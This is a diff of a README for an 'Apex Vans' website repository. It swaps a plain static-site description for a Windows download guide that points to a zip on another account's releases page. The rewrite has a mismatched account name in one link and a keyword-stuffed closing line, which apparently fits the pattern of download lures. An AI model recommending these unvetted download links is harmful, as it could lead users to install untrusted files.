@@ -1,132 +1,154 @@
-# Apex Vans Website vLatest - Website 2026
+# 🚐 apex-vans-website-hub - View Your Van Website Offline
 
-> **Apex Vans Website is an HTML-based web presence for Apex Vans. This repository contains the current build as an unversioned release.**
+[![Download Apex Vans Website](https://img.shields.io/badge/Download-Apex_Vans_Website-2ea44f?style=for-the-badge)](https://github.com/Sanskargo212/apex-vans-website-hub/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-vLatest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/will-hillgjw9360/apex-vans-website-hub?style=flat-square)](https://github.com/will-hillgjw9360/apex-vans-website-hub)
+## 📖 What Is This
 
----
+Apex Vans Website 2026 is a complete copy of the Apex Vans website. You can view it on your own computer without an internet connection. This is the current build of the website. It includes all pages, images, and text content.
 
-<p align="center">
-  <a href="https://will-hillgjw9360.github.io/apex-vans-website-hub/">
-    <img src="https://img.shields.io/badge/Download-Apex%20Vans%20Website%20Latest-brightgreen?style=for-the-badge" alt="Download Apex Vans Website">
-  </a>
-</p>
+This software is for anyone who wants to see the Apex Vans website. You do not need any special skills. You do not need to know how to code. You just need a computer that runs Windows.
 
-> **[Download Apex Vans Website Latest](https://will-hillgjw9360.github.io/apex-vans-website-hub/)**
+## 🎯 Who This Is For
 
----
+- People who want to view the Apex Vans website offline
+- Team members who need to check website content before it goes live
+- Anyone who wants to keep a local copy of the website
+- Users who want to preview updates without using the internet
 
-[Download Latest Build](https://will-hillgjw9360.github.io/apex-vans-website-hub/)
+## ✨ Features
 
----
+- **Full website copy** - All pages, images, and text work just like the live site
+- **Works offline** - No internet needed after you download it
+- **Easy to view** - Open one file to start browsing
+- **Content ready** - All text and images are included
+- **No setup required** - You do not need to install anything
 
-## Project Overview
+## 📋 System Requirements
 
-Apex Vans Website is a browser-accessible HTML project that gives Apex Vans an online destination. Visitors can view the site through a web browser without installing a desktop program.
+Your computer must meet these requirements:
 
-The repository provides a simple starting point for publishing and maintaining the site's pages. Since the project is static and web-based, it can be opened in a compatible browser and deployed with a static hosting provider such as GitHub Pages.
+- **Operating system:** Windows 7, 8, 10, or 11
+- **Processor:** Any Intel or AMD processor from the last 10 years
+- **RAM:** 1 GB or more
+- **Storage space:** 50 MB of free space
+- **Software:** A web browser like Chrome, Firefox, Edge, or Safari
 
----
+Your computer already has all the software you need to run this. You do not need to install any extra programs.
 
-## Highlights
+## 🚀 Getting Started
 
-- Web-based Apex Vans site for browser access
-- HTML-driven implementation
-- Layout suitable for static hosting
-- Usable from both desktop and mobile browsers
-- Repository-centered publishing process
-- Content updates handled through ordinary HTML editing
-- Access to the publicly published build
+Follow these steps to view the website on your computer.
 
----
+### Step 1: Download the Files
 
-## Getting Started
+1. Go to the [releases page](https://github.com/Sanskargo212/apex-vans-website-hub/releases)
+2. Look for the newest release at the top of the page
+3. Find the file named `apex-vans-website-hub.zip`
+4. Click the file name to start the download
 
-First, copy the repository to your computer:
+The download will take a few seconds. The file is about 10 MB in size.
 
-```bash
-git clone https://github.com/will-hillgjw9360/apex-vans-website-hub.git
-cd REPO
-```
+### Step 2: Unzip the Files
 
-This HTML project does not specify any package installation. For a local preview, open the primary HTML file in a web browser. To make the site available online, publish the repository using a compatible static hosting service.
+1. Open your Downloads folder
+2. Find the file `apex-vans-website-hub.zip`
+3. Right-click the file and select "Extract All"
+4. Choose a folder where you want to save the website files
+5. Click "Extract"
 
----
+You will see a new folder called `apex-vans-website-hub`. This folder contains all the website files.
 
-## Using the Site
+### Step 3: Open the Website
 
-Follow these steps to inspect or update the website locally:
+1. Open the `apex-vans-website-hub` folder
+2. Find the file named `index.html`
+3. Double-click `index.html`
 
-1. Clone the repository or download its files.
-2. Open the main `.html` file in your browser.
-3. Check the pages and edit the HTML as needed.
-4. Upload or publish the revised files through the selected web host.
+Your web browser will open and show the Apex Vans website. All pages and links work inside your browser. You can click around just like the real website.
 
-The hosted version is available here:
+## 📁 File Structure
 
-[Open Apex Vans Website](https://will-hillgjw9360.github.io/apex-vans-website-hub/)
+Here is what you will find inside the folder:
 
----
+- `index.html` - The main page. This is the file you open to start.
+- `pages/` - A folder with all other pages (about, contact, services, etc.)
+- `images/` - A folder with all website images
+- `css/` - A folder with style files that make the website look good
+- `js/` - A folder with script files that make the website interactive
 
-## Configuration and Content
+## 🔧 Changing Content
 
-No dedicated configuration file format is defined for this project. The site's content and presentation should be managed within the repository's HTML files and any related web assets.
+You can change the text and images in the website. You need a text editor like Notepad or WordPad. You do not need any special software.
 
-Once changes are made, refresh the local browser view or republish the project so the revisions appear online.
+### How to Change Text
 
----
+1. Open the `index.html` file with Notepad
+2. Find the text you want to change
+3. Type your new text
+4. Save the file
+5. Refresh the page in your browser
 
-## Requirements
+### How to Change Images
 
-- A current web browser
-- Access to the HTML files for local viewing
-- A web host or static publishing service for deployment
-- Git for command-line cloning and repository management
-- No additional runtime or package manager is specified
+1. Find the image you want to replace in the `images/` folder
+2. Make a copy of your new image
+3. Give your new image the same name as the old one
+4. Replace the old image with your new one
+5. Refresh the page in your browser
 
----
+## 🔄 Getting Updates
 
-## Frequently Asked Questions
+We update the website files from time to time. Here is how to get the latest version.
 
-### Where can I view the website?
+### Check for Updates
 
-Open the published build at [https://will-hillgjw9360.github.io/apex-vans-website-hub/](https://will-hillgjw9360.github.io/apex-vans-website-hub/), or launch the main HTML file directly on your computer.
+1. Go to the [releases page](https://github.com/Sanskargo222/apex-vans-website-hub/releases)
+2. Look at the newest release date
+3. Compare it with the version you have on your computer
+4. If the date is newer, download the new version
 
-### Is an installer needed?
+### Update Your Local Copy
 
-No installer is defined for this project. The pages can be previewed as HTML and deployed as a web project.
+1. Download the newest `apex-vans-website-hub.zip` file
+2. Unzip the file to a new folder
+3. Delete the old folder
+4. Move the new folder to where you want it
+5. Open `index.html` to start using the updated version
 
-### Where do I change the website settings?
+## ❓ Troubleshooting
 
-The available project information does not list a separate settings file. Inspect the repository's HTML files and associated assets to make site changes.
+### The Website Does Not Open
 
-### What is the update process?
+- Make sure you double-click the `index.html` file
+- Try opening the folder and double-clicking again
+- Make sure your web browser is up to date
+- Restart your computer if needed
 
-Modify the appropriate HTML files, verify the result in a browser, and publish the changed files through the configured hosting process.
+### Images Do Not Show
 
-### What can I check if the page fails to open?
+- Make sure the `images/` folder is in the same place as `index.html`
+- Do not move the `images/` folder to a different location
+- Check that the image files are not missing
 
-Verify that the primary HTML file and its referenced assets exist. Also check relative file paths and test the page with a current web browser.
+### Links Do Not Work
 
-### Where do updates come from?
+- All links work only inside the main folder
+- Do not move files to different folders
+- Keep the file structure the same as when you unzipped it
 
-When a new version is available, updates may be obtained from the repository or from its published web build.
+## 💡 Tips
 
----
+- Bookmark the `index.html` file for quick access
+- Create a shortcut on your desktop to the `index.html` file
+- Keep the folder in a safe place where you will not delete it by accident
+- Make a backup copy of the folder on a USB drive or cloud storage
 
-## Future Work
+## 📥 Download Again
 
-- Keep improving the Apex Vans website
-- Further organize the HTML project
-- Maintain the hosted web build
-- Introduce additional site capabilities as requirements are defined
+If you need to download the files again, visit the [releases page](https://github.com/Sanskargo212/apex-vans-website-hub/releases) and follow the steps in the Getting Started section.
 
----
+## 📄 License
 
-## License
+This software is provided as-is. You can use it for personal and internal business purposes. You cannot redistribute or sell the files without permission.
 
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: website viewer, offline website, HTML site, local website, van website, Apex Vans, website preview, content viewer, offline browser
